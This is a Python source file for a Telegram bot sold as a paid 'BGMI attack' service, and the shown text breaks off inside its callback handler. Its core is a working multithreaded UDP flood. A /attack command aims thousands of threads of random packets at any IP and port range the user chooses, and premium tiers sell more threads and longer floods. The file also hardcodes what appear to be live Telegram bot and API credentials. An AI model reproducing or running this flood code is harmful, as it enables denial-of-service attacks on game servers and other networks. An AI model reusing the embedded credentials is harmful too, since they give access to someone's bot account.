#!/usr/bin/env python3
"""
💎 ULTIMATE PREMIUM BGMI ATTACK BOT 💎
Video System | Attack | Premium | Groups | Mute | Admin
"""

import asyncio
import json
import random
import os
import time
import socket
import threading
import logging
from datetime import datetime, timedelta
import pytz
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    ChatPermissions, CallbackQuery
)
from pyrogram.errors import FloodWait

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ═══════════════ CONFIG ═══════════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8881462630:AAEQX_BDAkR9wRehuE2fO2RoCoNUybBwVWs"
OWNER_ID = 7614459746
OWNER_USERNAME = "BESTCHEAT_OWNER"

# ═══════════════ DATABASE FILES ═══════════════
VIDEO_DB = "videos.json"
GROUPS_DB = "groups.json"
MUTE_DB = "mutes.json"
USERS_DB = "users.json"

# ═══════════════ TIMEZONE ═══════════════
IST = pytz.timezone('Asia/Kolkata')

# ═══════════════ STYLES ═══════════════
LINE = "━━━━━━━━━━━━━━━━━━━"
LINE_BIG = "━━━━━━━━━━━━━━━━━━━━━━"

# ═══════════════ PREMIUM SETTINGS ═══════════════
FREE_THREADS = 500
FREE_TIME = 120
PREMIUM_THREADS = 5000
PREMIUM_TIME = 600
PREMIUM_PRICE = "₹299/month"

# ═══════════════ VIDEO TRACKING ═══════════════
used_video_ids = []

# ═══════════════ DATABASE FUNCTIONS ═══════════════

def load_json(file, default=None):
    """Load JSON file"""
    if default is None:
        default = {}
    try:
        if os.path.exists(file):
            with open(file, "r") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(file, data):
    """Save JSON file"""
    with open(file, "w") as f:
        json.dump(data, f, indent=2)

# ─── Video Functions ───
def load_videos():
    return load_json(VIDEO_DB, [])

def save_video_data(videos):
    save_json(VIDEO_DB, videos)

def add_video(video_path):
    videos = load_videos()
    video_id = len(videos) + 1
    videos.append({
        "id": video_id,
        "path": video_path,
        "timestamp": datetime.now(IST).isoformat(),
        "name": os.path.basename(video_path)
    })
    save_video_data(videos)
    return video_id

def get_random_video():
    global used_video_ids
    videos = load_videos()
    if not videos:
        return None
    
    available = [v for v in videos if v["id"] not in used_video_ids]
    if not available:
        used_video_ids.clear()
        available = videos
    
    video = random.choice(available)
    used_video_ids.append(video["id"])
    
    if len(used_video_ids) > 50:
        used_video_ids = used_video_ids[-20:]
    
    return video

def get_video_count():
    return len(load_videos())

def delete_video(video_id):
    videos = load_videos()
    for i, v in enumerate(videos):
        if v["id"] == video_id:
            deleted = videos.pop(i)
            if os.path.exists(deleted["path"]):
                os.remove(deleted["path"])
            save_video_data(videos)
            if video_id in used_video_ids:
                used_video_ids.remove(video_id)
            return True
    return False

def clear_all_videos():
    videos = load_videos()
    for v in videos:
        if os.path.exists(v["path"]):
            os.remove(v["path"])
    save_video_data([])
    return len(videos)

# ─── User Functions ───
def load_users():
    return load_json(USERS_DB, {"premium": [], "authorized": []})

def save_users(users):
    save_json(USERS_DB, users)

def is_premium(user_id):
    if user_id == OWNER_ID:
        return True
    users = load_users()
    return str(user_id) in users.get("premium", [])

def is_authorized(user_id):
    if user_id == OWNER_ID:
        return True
    users = load_users()
    return str(user_id) in users.get("premium", []) or str(user_id) in users.get("authorized", [])

def add_premium_user(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users.get("premium", []):
        users.setdefault("premium", []).append(uid)
        save_users(users)
        return True
    return False

def remove_premium_user(user_id):
    users = load_users()
    uid = str(user_id)
    if uid in users.get("premium", []):
        users["premium"].remove(uid)
        save_users(users)
        return True
    return False

def add_authorized_user(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users.get("authorized", []):
        users.setdefault("authorized", []).append(uid)
        save_users(users)
        return True
    return False

def get_premium_list():
    users = load_users()
    return users.get("premium", [])

# ─── Group Functions ───
def load_groups():
    return load_json(GROUPS_DB, {})

def save_group(group_id, group_name):
    groups = load_groups()
    groups[str(group_id)] = {
        "name": group_name,
        "added_at": datetime.now(IST).isoformat(),
        "enabled": True
    }
    save_json(GROUPS_DB, groups)

def remove_group(group_id):
    groups = load_groups()
    gid = str(group_id)
    if gid in groups:
        del groups[gid]
        save_json(GROUPS_DB, groups)
        return True
    return False

def get_all_groups():
    return load_groups()

def is_group_enabled(group_id):
    groups = load_groups()
    return str(group_id) in groups and groups[str(group_id)].get("enabled", True)

def toggle_group(group_id):
    groups = load_groups()
    gid = str(group_id)
    if gid in groups:
        groups[gid]["enabled"] = not groups[gid].get("enabled", True)
        save_json(GROUPS_DB, groups)
        return groups[gid]["enabled"]
    return False

# ─── Mute Functions ───
def load_mutes():
    return load_json(MUTE_DB, {})

def save_mute(group_id, user_id, until):
    mutes = load_mutes()
    mutes[f"{group_id}_{user_id}"] = until
    save_json(MUTE_DB, mutes)

def remove_mute(group_id, user_id):
    mutes = load_mutes()
    key = f"{group_id}_{user_id}"
    if key in mutes:
        del mutes[key]
        save_json(MUTE_DB, mutes)
        return True
    return False

def is_muted(group_id, user_id):
    mutes = load_mutes()
    key = f"{group_id}_{user_id}"
    if key in mutes:
        until = mutes[key]
        if until == "permanent":
            return True
        try:
            if datetime.now() < datetime.fromisoformat(until):
                return True
            else:
                remove_mute(group_id, user_id)
        except:
            remove_mute(group_id, user_id)
    return False

# ─── Helper Functions ───
def get_current_time():
    return datetime.now(IST).strftime("%I:%M:%S %p")

def get_current_date():
    return datetime.now(IST).strftime("%B %d, %Y")

def premium_badge(uid):
    return "💎 **PREMIUM**" if is_premium(uid) else "🆓 **FREE**"

def get_limit(uid, limit_type):
    if is_premium(uid):
        return PREMIUM_THREADS if limit_type == 'threads' else PREMIUM_TIME
    return FREE_THREADS if limit_type == 'threads' else FREE_TIME

def get_progress_bar(percent, length=15):
    filled = int(percent / 100 * length)
    return "█" * filled + "▒" * (length - filled)

def get_time_str(seconds):
    if seconds < 60:
        return f"{int(seconds)}s"
    elif seconds < 3600:
        m, s = int(seconds // 60), int(seconds % 60)
        return f"{m}m {s}s"
    else:
        h, m = int(seconds // 3600), int((seconds % 3600) // 60)
        return f"{h}h {m}m"

def format_duration(value, unit):
    units = {"second": "s", "minute": "m", "hour": "h", "day": "d", "week": "w"}
    return f"{value}{units.get(unit, '')}"

def parse_time(time_str):
    if time_str.endswith('s'):
        val = int(time_str[:-1])
        if 30 <= val <= 60: return val, "second"
    elif time_str.endswith('m'):
        val = int(time_str[:-1])
        if 1 <= val <= 60: return val, "minute"
    elif time_str.endswith('h'):
        val = int(time_str[:-1])
        if 1 <= val <= 24: return val, "hour"
    elif time_str.endswith('d'):
        val = int(time_str[:-1])
        if 1 <= val <= 30: return val, "day"
    elif time_str.endswith('w'):
        val = int(time_str[:-1])
        if 1 <= val <= 3: return val, "week"
    return None, None

# ═══════════════ ATTACK ENGINE ═══════════════

class BGMIAttack:
    def __init__(self):
        self.running = False
        self.packets = 0
        self.bytes_sent = 0
        self.errors = 0
        self.lock = threading.Lock()
    
    def udp_flood(self, ip, port, end_time):
        """UDP flood on BGMI game ports"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 10)
        sock.settimeout(0.001)
        
        game_ports = list(range(7000, 15000)) + [17500, 20000, 27000]
        
        while self.running and time.time() < end_time:
            try:
                for _ in range(20):
                    if not self.running:
                        break
                    
                    packet = random.randbytes(random.randint(500, 1500))
                    target_port = random.choice(game_ports)
                    sock.sendto(packet, (ip, target_port))
                    
                    with self.lock:
                        self.packets += 1
                        self.bytes_sent += len(packet)
            except:
                with self.lock:
                    self.errors += 1
        
        sock.close()
    
    def start_attack(self, ip, port, duration, threads):
        """Start attack with multiple threads"""
        self.running = True
        self.packets = 0
        self.bytes_sent = 0
        self.errors = 0
        
        end_time = time.time() + duration
        workers = []
        
        for _ in range(threads):
            t = threading.Thread(target=self.udp_flood, args=(ip, port, end_time))
            t.daemon = True
            t.start()
            workers.append(t)
        
        time.sleep(duration)
        self.running = False
        
        for t in workers:
            t.join(timeout=0.1)
        
        elapsed = max(duration, 0.1)
        
        return {
            'packets': self.packets,
            'bytes': self.bytes_sent,
            'mb': self.bytes_sent / 1024 / 1024,
            'mbps': (self.bytes_sent * 8) / (elapsed * 1_000_000),
            'errors': self.errors,
            'elapsed': elapsed
        }
    
    def stop(self):
        self.running = False

# ═══════════════ INIT ═══════════════
attacker = BGMIAttack()
attacking = False
attack_info = {}
attack_message = None

# ═══════════════ BOT CREATE ═══════════════
print("🔧 Creating Premium Bot...")
app = Client(
    "premium_attack_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ═══════════════ KEYBOARDS ═══════════════

def get_main_keyboard():
    """Main menu keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 ═══ ATTACK MENU ═══ 💀", callback_data="attack_menu")],
        [InlineKeyboardButton("⚡ START ATTACK", callback_data="quick_attack"),
         InlineKeyboardButton("⛔ STOP ATTACK", callback_data="stop_attack")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📊 LIVE STATUS", callback_data="status"),
         InlineKeyboardButton("👤 PROFILE", callback_data="profile")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("💎 PREMIUM MENU", callback_data="premium_menu"),
         InlineKeyboardButton("🎬 VIDEO MANAGER", callback_data="video_menu")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"),
         InlineKeyboardButton("ℹ️ HELP", callback_data="help")],
    ])

def get_video_keyboard():
    """Video manager keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 ADD VIDEO", callback_data="add_video_menu")],
        [InlineKeyboardButton("📋 LIST VIDEOS", callback_data="list_videos")],
        [InlineKeyboardButton("🗑️ DELETE VIDEO", callback_data="delete_video_menu")],
        [InlineKeyboardButton("🧹 CLEAR ALL VIDEOS", callback_data="clear_videos")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📊 VIDEO STATS", callback_data="video_stats")],
        [InlineKeyboardButton("🔙 BACK TO MENU", callback_data="back_main")],
    ])

def get_back_button():
    """Back button"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
    ])

def get_admin_keyboard():
    """Admin panel keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💎 ADD PREMIUM", callback_data="add_premium_menu")],
        [InlineKeyboardButton("❌ REMOVE PREMIUM", callback_data="remove_premium_menu")],
        [InlineKeyboardButton("✅ ADD USER", callback_data="add_user_menu")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📋 PREMIUM LIST", callback_data="premium_list")],
        [InlineKeyboardButton("📊 BOT STATS", callback_data="bot_stats")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="broadcast_menu")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back_main")],
    ])

# ═══════════════ SEND VIDEO HELPER ═══════════════

async def send_with_video(chat_id, text, keyboard=None, video=None):
    """Send message with random video"""
    if video is None:
        video = get_random_video()
    
    try:
        if video and os.path.exists(video["path"]):
            return await app.send_video(
                chat_id,
                video["path"],
                caption=text,
                reply_markup=keyboard
            )
        else:
            return await app.send_message(
                chat_id,
                text,
                reply_markup=keyboard
            )
    except Exception as e:
        logger.error(f"Send error: {e}")
        return await app.send_message(chat_id, text, reply_markup=keyboard)

# ═══════════════ START COMMAND ═══════════════

@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message: Message):
    user = message.from_user
    uid = user.id
    
    if not is_authorized(uid):
        await message.reply_text(
            f"❌ **ACCESS DENIED!**\n\n"
            f"👤 {user.first_name}\n"
            f"🆔 `{uid}`\n\n"
            f"📲 Contact: @{OWNER_USERNAME}\n"
            f"💰 Premium: {PREMIUM_PRICE}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📲 Contact Owner", url=f"https://t.me/{OWNER_USERNAME}")]
            ])
        )
        return
    
    welcome_text = f"""
💎 **PREMIUM BGMI ATTACK BOT** 💎

{LINE}
👤 **User:** `{user.first_name}`
🆔 **ID:** `{uid}`
💳 **Plan:** {premium_badge(uid)}
{LINE}

⚡ **Power:** `{get_limit(uid, 'threads')}` Threads
⏱️ **Max Time:** `{get_limit(uid, 'time')}s`
📹 **Videos:** `{get_video_count()}`
👥 **Groups:** `{len(get_all_groups())}`

{LINE}
🎯 **Attack Command:**
`/attack <IP> <PORT> <TIME>`

📋 **Example:**
`/attack 157.240.1.1 8080 120`

🎮 **BGMI Ports:** 7000-15000
{LINE}

🔽 **SELECT OPTION:**
"""
    
    await send_with_video(message.chat.id, welcome_text, get_main_keyboard())

# ═══════════════ ATTACK COMMAND ═══════════════

@app.on_message(filters.command("attack") & filters.private)
async def attack_command(client, message: Message):
    global attacking, attack_info, attack_message
    
    uid = message.from_user.id
    
    if not is_authorized(uid):
        return await message.reply_text("❌ **Access Denied!**")
    
    if not is_premium(uid):
        return await message.reply_text(
            f"💎 **PREMIUM REQUIRED!**\n\n"
            f"💰 Price: {PREMIUM_PRICE}\n"
            f"📲 Contact: @{OWNER_USERNAME}\n\n"
            f"Upgrade to unlock attack!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📲 Contact", url=f"https://t.me/{OWNER_USERNAME}")]
            ])
        )
    
    if attacking:
        elapsed = time.time() - attack_info['start']
        return await message.reply_text(
            f"⚠️ **ATTACK ALREADY RUNNING!**\n\n"
            f"🎯 `{attack_info['ip']}:{attack_info['port']}`\n"
            f"⏱️ `{int(elapsed)}s` elapsed\n\n"
            f"🛑 `/stop` to cancel"
        )
    
    parts = message.text.split()
    if len(parts) < 4:
        return await message.reply_text(
            f"⚠️ **USAGE:** `/attack <IP> <PORT> <TIME>`\n\n"
            f"📋 **Example:** `/attack 157.240.1.1 8080 120`\n\n"
            f"🎮 **BGMI Ports:** 7000-15000\n"
            f"⏱️ **Max:** {get_limit(uid, 'time')}s\n"
            f"🧵 **Threads:** {get_limit(uid, 'threads')}"
        )
    
    ip = parts[1]
    
    try:
        port = int(parts[2])
        if port < 1 or port > 65535:
            return await message.reply_text("❌ Port: 1-65535")
    except:
        return await message.reply_text("❌ Invalid port!")
    
    try:
        dur = int(parts[3])
        max_time = get_limit(uid, 'time')
        if dur < 1 or dur > max_time:
            return await message.reply_text(f"❌ Time: 1-{max_time}s")
    except:
        return await message.reply_text("❌ Invalid time!")
    
    threads = get_limit(uid, 'threads')
    
    attack_info = {
        'ip': ip,
        'port': port,
        'time': dur,
        'start': time.time(),
        'threads': threads
    }
    attacking = True
    
    # Send attack start
    start_text = f"""
💀 **ATTACK LAUNCHED!** 💀

{LINE}
🎯 **Target:** `{ip}:{port}`
⏱️ **Duration:** `{get_time_str(dur)}`
🧵 **Threads:** `{threads}`
💳 **Plan:** {premium_badge(uid)}
{LINE}

⏳ Initializing attack...
🔄 Connecting to target...
📡 Sending BGMI game packets...
🔥 Flooding all game ports!

{LINE}
🛑 **Stop:** `/stop`
📊 **Status:** `/status`
{LINE}
"""
    
    attack_message = await send_with_video(message.chat.id, start_text)
    
    # Live update task
    async def live_updates():
        start_t = time.time()
        last_update = 0
        
        while attacking:
            try:
                now = time.time()
                elapsed = now - start_t
                
                if elapsed >= dur:
                    break
                
                if now - last_update < 2:
                    await asyncio.sleep(0.5)
                    continue
                
                last_update = now
                remaining = dur - elapsed
                percent = (elapsed / dur) * 100
                bar = get_progress_bar(percent)
                
                mbps = (attacker.bytes_sent * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
                
                live_text = f"""
💀 **ATTACK IN PROGRESS!** 💀

{LINE}
🎯 `{ip}:{port}`
⏱️ `{get_time_str(elapsed)}` / `{get_time_str(dur)}`
{bar} `{percent:.1f}%`
{LINE}
📦 **Packets:** `{attacker.packets:,}`
📤 **Data:** `{attacker.bytes_sent / 1024 / 1024:.1f} MB`
📶 **Speed:** `{mbps:.1f} Mbps`
❌ **Errors:** `{attacker.errors}`
{LINE}
💳 {premium_badge(uid)}
🛑 `/stop`
{LINE}
"""
                
                try:
                    await attack_message.edit_text(live_text)
                except:
                    pass
                
                await asyncio.sleep(0.5)
            except Exception as e:
                logger.error(f"Live update error: {e}")
                break
    
    asyncio.create_task(live_updates())
    
    # Run attack in thread pool
    loop = asyncio.get_event_loop()
    
    try:
        stats = await loop.run_in_executor(
            None,
            attacker.start_attack,
            ip, port, dur, threads
        )
        
        # Attack completed
        attacking = False
        attack_info = {}
        
        done_text = f"""
✅ **ATTACK COMPLETED!** ✅

{LINE}
🎯 **Target:** `{ip}:{port}`
⏱️ **Duration:** `{get_time_str(dur)}`
🧵 **Threads:** `{threads}`
{LINE}
📊 **FINAL REPORT:**
{LINE}
📦 **Packets:** `{stats['packets']:,}`
📤 **Data:** `{stats['mb']:.1f} MB`
📶 **Speed:** `{stats['mbps']:.1f} Mbps`
❌ **Errors:** `{stats['errors']}`
{LINE}
🟢 **STATUS:** SUCCESS ✅
💀 **TARGET STRESSED!**
{LINE}

🔄 **New Attack:** `/attack IP PORT TIME`
📋 **Menu:** `/start`
"""
        
        await send_with_video(message.chat.id, done_text)
        
        try:
            await attack_message.edit_text(done_text)
        except:
            pass
        
    except Exception as e:
        attacking = False
        attack_info = {}
        
        error_text = f"""
❌ **ATTACK FAILED!** ❌

{LINE}
🔴 **Error:** `{str(e)}`
{LINE}

💡 **Check:**
• Target online?
• Port open?
• Network stable?

🔄 **Retry:** `/attack {ip} {port} {dur}`
"""
        
        try:
            await attack_message.edit_text(error_text)
        except:
            await message.reply_text(error_text)

# ═══════════════ STOP COMMAND ═══════════════

@app.on_message(filters.command("stop") & filters.private)
async def stop_command(client, message: Message):
    global attacking, attack_info
    
    if not is_authorized(message.from_user.id):
        return
    
    if attacking:
        attacker.stop()
        elapsed = time.time() - attack_info.get('start', 0)
        attacking = False
        
        await message.reply_text(
            f"⛔ **ATTACK STOPPED!** ⛔\n\n"
            f"{LINE}\n"
            f"🎯 `{attack_info.get('ip')}:{attack_info.get('port')}`\n"
            f"⏱️ Ran: `{int(elapsed)}s`\n"
            f"📦 Packets: `{attacker.packets:,}`\n"
            f"{LINE}\n\n"
            f"🔄 `/attack IP PORT TIME`"
        )
        
        attack_info = {}
    else:
        await message.reply_text("💤 **No attack running!**\n\n⚔️ `/attack IP PORT TIME`")

# ═══════════════ STATUS COMMAND ═══════════════

@app.on_message(filters.command("status") & filters.private)
async def status_command(client, message: Message):
    if not is_authorized(message.from_user.id):
        return
    
    if attacking:
        elapsed = time.time() - attack_info['start']
        remaining = attack_info['time'] - elapsed
        mbps = (attacker.bytes_sent * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
        
        await message.reply_text(
            f"📊 **LIVE ATTACK STATUS** 📊\n\n"
            f"{LINE}\n"
            f"🟢 **STATUS:** ATTACKING\n"
            f"{LINE}\n"
            f"🎯 `{attack_info['ip']}:{attack_info['port']}`\n"
            f"⏱️ `{int(elapsed)}s` / `{attack_info['time']}s`\n"
            f"⏳ Remaining: `{int(remaining)}s`\n"
            f"📦 Packets: `{attacker.packets:,}`\n"
            f"📶 Speed: `{mbps:.1f}` Mbps\n"
            f"{LINE}\n"
            f"🛑 `/stop`"
        )
    else:
        await message.reply_text(
            f"💤 **IDLE**\n\n"
            f"⚔️ `/attack IP PORT TIME`\n"
            f"📋 `/start` for menu"
        )

# ═══════════════ ADD VIDEO COMMAND ═══════════════

@app.on_message(filters.command("addvideo") & filters.private)
async def add_video_command(client, message: Message):
    if not is_authorized(message.from_user.id):
        return
    
    if not message.reply_to_message or not message.reply_to_message.video:
        return await message.reply_text(
            "❌ **Reply to a video!**\n\n"
            "📤 Reply to a video message with `/addvideo`"
        )
    
    status_msg = await message.reply_text("⏳ **Downloading video...**")
    
    try:
        video_path = await message.reply_to_message.download()
        video_id = add_video(video_path)
        count = get_video_count()
        
        await status_msg.edit_text(
            f"✅ **VIDEO ADDED SUCCESSFULLY!** ✅\n\n"
            f"{LINE}\n"
            f"🆔 **Video ID:** `{video_id}`\n"
            f"📁 **Name:** `{os.path.basename(video_path)[:30]}`\n"
            f"📹 **Total Videos:** `{count}`\n"
            f"{LINE}\n\n"
            f"🎲 Video will play randomly!\n"
            f"📋 `/videos` to see all videos"
        )
    except Exception as e:
        await status_msg.edit_text(f"❌ **Error:** `{str(e)}`")

# ═══════════════ LIST VIDEOS COMMAND ═══════════════

@app.on_message(filters.command("videos") & filters.private)
async def list_videos_command(client, message: Message):
    if not is_authorized(message.from_user.id):
        return
    
    videos = load_videos()
    
    if not videos:
        return await message.reply_text(
            "📹 **NO VIDEOS!**\n\n"
            "📤 Use `/addvideo` (reply to a video)\n"
            "to add videos to the bot!"
        )
    
    text = f"🎬 **ALL VIDEOS** ({len(videos)})\n\n{LINE}\n"
    
    for i, v in enumerate(videos[:20]):
        text += f"**#{v['id']}** 📹 `{v['name'][:30]}`\n"
    
    if len(videos) > 20:
        text += f"\n... and `{len(videos) - 20}` more!"
    
    text += f"\n{LINE}\n📹 **Total:** `{len(videos)}` videos\n"
    text += f"🗑️ `/delvideo ID` to delete"
    
    await message.reply_text(text)

# ═══════════════ DELETE VIDEO COMMAND ═══════════════

@app.on_message(filters.command("delvideo") & filters.private)
async def delete_video_command(client, message: Message):
    if not is_authorized(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        return await message.reply_text("❌ **Usage:** `/delvideo ID`")
    
    try:
        video_id = int(parts[1])
        if delete_video(video_id):
            await message.reply_text(
                f"✅ **Video #{video_id} Deleted!**\n"
                f"📹 Remaining: `{get_video_count()}`"
            )
        else:
            await message.reply_text("❌ **Video not found!**")
    except:
        await message.reply_text("❌ **Invalid ID!**")

# ═══════════════ CLEAR VIDEOS COMMAND ═══════════════

@app.on_message(filters.command("clearvideos") & filters.private)
async def clear_videos_command(client, message: Message):
    if not is_authorized(message.from_user.id):
        return
    
    count = clear_all_videos()
    
    if count > 0:
        await message.reply_text(
            f"🗑️ **ALL VIDEOS CLEARED!**\n\n"
            f"📹 `{count}` videos deleted!"
        )
    else:
        await message.reply_text("📹 **No videos to clear!**")

# ═══════════════ ADMIN COMMANDS ═══════════════

@app.on_message(filters.command("addpremium") & filters.private)
async def add_premium_cmd(client, message: Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply_text("❌ **Owner Only!**")
    
    parts = message.text.split()
    if len(parts) != 2:
        return await message.reply_text("❌ `/addpremium USER_ID`")
    
    if add_premium_user(parts[1]):
        await message.reply_text(f"✅ User `{parts[1]}` is now 💎 **PREMIUM!**")
    else:
        await message.reply_text("⚠️ Already premium!")

@app.on_message(filters.command("removepremium") & filters.private)
async def remove_premium_cmd(client, message: Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply_text("❌ **Owner Only!**")
    
    parts = message.text.split()
    if len(parts) != 2:
        return await message.reply_text("❌ `/removepremium USER_ID`")
    
    if remove_premium_user(parts[1]):
        await message.reply_text(f"✅ Premium removed from `{parts[1]}`")
    else:
        await message.reply_text("⚠️ Not premium!")

@app.on_message(filters.command("adduser") & filters.private)
async def add_user_cmd(client, message: Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply_text("❌ **Owner Only!**")
    
    parts = message.text.split()
    if len(parts) != 2:
        return await message.reply_text("❌ `/adduser USER_ID`")
    
    if add_authorized_user(parts[1]):
        await message.reply_text(f"✅ User `{parts[1]}` authorized!")
    else:
        await message.reply_text("⚠️ Already authorized!")

@app.on_message(filters.command("premiumlist") & filters.private)
async def premium_list_cmd(client, message: Message):
    if message.from_user.id != OWNER_ID:
        return await message.reply_text("❌ **Owner Only!**")
    
    users = get_premium_list()
    
    if not users:
        return await message.reply_text("💎 **No premium users!**")
    
    text = f"💎 **PREMIUM USERS** ({len(users)})\n\n{LINE}\n"
    for uid in users:
        text += f"• `{uid}`\n"
    text += f"{LINE}"
    
    await message.reply_text(text)

@app.on_message(filters.command("stats") & filters.private)
async def stats_cmd(client, message: Message):
    if not is_authorized(message.from_user.id):
        return
    
    videos = load_videos()
    users = load_users()
    groups = get_all_groups()
    
    total_size = 0
    for v in videos:
        if os.path.exists(v["path"]):
            total_size += os.path.getsize(v["path"])
    
    text = f"""
📊 **BOT STATISTICS** 📊

{LINE}
📹 **Videos:** `{len(videos)}`
💾 **Size:** `{total_size / (1024*1024):.1f} MB`
{LINE}
💎 **Premium:** `{len(users.get('premium', []))}`
✅ **Authorized:** `{len(users.get('authorized', []))}`
{LINE}
👥 **Groups:** `{len(groups)}`
✅ **Enabled:** `{sum(1 for g in groups.values() if g.get('enabled', True))}`
{LINE}
⚡ **Attack System:** {'🟢 Online' if not attacking else '💀 Attacking'}
{LINE}
🕐 {get_current_time()} • 📅 {get_current_date()}
{LINE}
💎 **Premium Bot Active!**
"""
    await message.reply_text(text)

# ═══════════════ CALLBACK HANDLERS ═══════════════

@app.on_callback_query()
async def callback_handler(client, callback_query: CallbackQuery):
    data = callback_query.data
    uid = callback_query.from_user.id
    
    if data == "sep":
        await callback_query.answer("━" * 20)
        return
    
    # ─── Main Menu ───
    if data == "back_main":
        user = callback_query.from_user
        text = f"""
💎 **MAIN MENU** 💎

{LINE}
👤 **{user.first_name}**
💳 {premium_badge(uid)}
{LINE}

🔽 **SELECT OPTION:**
"""
        await send_with_video(
            callback_query.message.chat.id,
            text,
            get_main_keyboard()
        )
        try:
            await callback_query.message.delete()
        except:
            pass
    
    # ─── Attack Menu ───
    elif data == "attack_menu":
        await callback_query.message.edit_text(
            f"💀 **ATTACK MENU** 💀\n\n"
            f"{LINE}\n"
            f"⚔️ **Command:**\n"
            f"`/attack <IP> <PORT> <TIME>`\n\n"
            f"📋 **Example:**\n"
            f"`/attack 157.240.1.1 8080 120`\n\n"
            f"{LINE}\n"
            f"🎮 **BGMI Ports:** 7000-15000\n"
            f"⚡ **Threads:** {get_limit(uid, 'threads')}\n"
            f"⏱️ **Max Time:** {get_limit(uid, 'time')}s\n"
            f"{LINE}",
            reply_markup=get_back_button()
        )
    
    elif data == "quick_attack":
        await callback_query.message.edit_text(
            f"⚡ **QUICK ATTACK**\n\n"
            f"{LINE}\n"
            f"Send command:\n"
            f"`/attack IP PORT TIME`\n\n"
            f"📋 Example:\n"
            f"`/attack 157.240.1.1 8080 120`\n"
            f"{LINE}",
            reply_markup=get_back_button()
        )
    
    elif data == "stop_attack":
        if attacking:
            attacker.stop()
            await callback_query.answer("⛔ Attack Stopped!", show_alert=True)
        else:
            await callback_query.answer("💤 No attack running", show_alert=True)
    
    elif data == "status":
        if attacking:
            elapsed = time.time() - attack_info['start']
            await callback_query.answer(
                f"🟢 Attacking!\n⏱️ {int(elapsed)}s\n📦 {attacker.packets:,}",
                show_alert=True
            )
        else:
            await callback_query.answer("💤 IDLE", show_alert=True)
    
    elif data == "profile":
        await callback_query.message.edit_text(
            f"👤 **USER PROFILE** 👤\n\n"
            f"{LINE}\n"
            f"🆔 `{uid}`\n"
            f"👤 {callback_query.from_user.first_name}\n"
            f"💳 {premium_badge(uid)}\n"
            f"⚡ {get_limit(uid, 'threads')} Threads\n"
            f"⏱️ {get_limit(uid, 'time')}s Max\n"
            f"{LINE}\n"
            f"🕐 {get_current_time()}",
            reply_markup=get_back_button()
        )
    
    # ─── Premium Menu ───
    elif data == "premium_menu":
        vid = get_random_video()
        text = f"""
💎 **PREMIUM FEATURES** 💎

{LINE}
⚡ **{PREMIUM_THREADS}** Threads
⏱️ **{PREMIUM_TIME}s** Max Time
🎬 **{get_video_count()}** Videos
👑 **Priority** Support
💀 **5x** More Power
{LINE}

💰 **Price:** {PREMIUM_PRICE}
📲 **Contact:** @{OWNER_USERNAME}

{LINE}
🔽 **SELECT:**
"""
        await send_with_video(
            callback_query.message.chat.id,
            text,
            InlineKeyboardMarkup([
                [InlineKeyboardButton("📲 Contact", url=f"https://t.me/{OWNER_USERNAME}")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
            ]),
            vid
        )
        try:
            await callback_query.message.delete()
        except:
            pass
    
    # ─── Video Menu ───
    elif data == "video_menu":
        await callback_query.message.edit_text(
            f"🎬 **VIDEO MANAGER** 🎬\n\n"
            f"{LINE}\n"
            f"📹 **Total Videos:** `{get_video_count()}`\n"
            f"{LINE}\n\n"
            f"📤 **Add:** Reply to video + `/addvideo`\n"
            f"📋 **List:** `/videos`\n"
            f"🗑️ **Delete:** `/delvideo ID`\n"
            f"🧹 **Clear:** `/clearvideos`\n"
            f"{LINE}",
            reply_markup=get_video_keyboard()
        )
    
    elif data == "add_video_menu":
        await callback_query.answer("Reply to a video with /addvideo", show_alert=True)
    
    elif data == "list_videos":
        videos = load_videos()
        if videos:
            text = f"📹 **VIDEOS** ({len(videos)})\n\n"
            for v in videos[:10]:
                text += f"#{v['id']} `{v['name'][:30]}`\n"
            await callback_query.message.edit_text(text, reply_markup=get_back_button())
        else:
            await callback_query.answer("No videos!", show_alert=True)
    
    elif data == "delete_video_menu":
        await callback_query.answer("Use: /delvideo ID", show_alert=True)
    
    elif data == "clear_videos":
        count = clear_all_videos()
        await callback_query.answer(f"🗑️ {count} videos cleared!", show_alert=True)
    
    elif data == "video_stats":
        videos = load_videos()
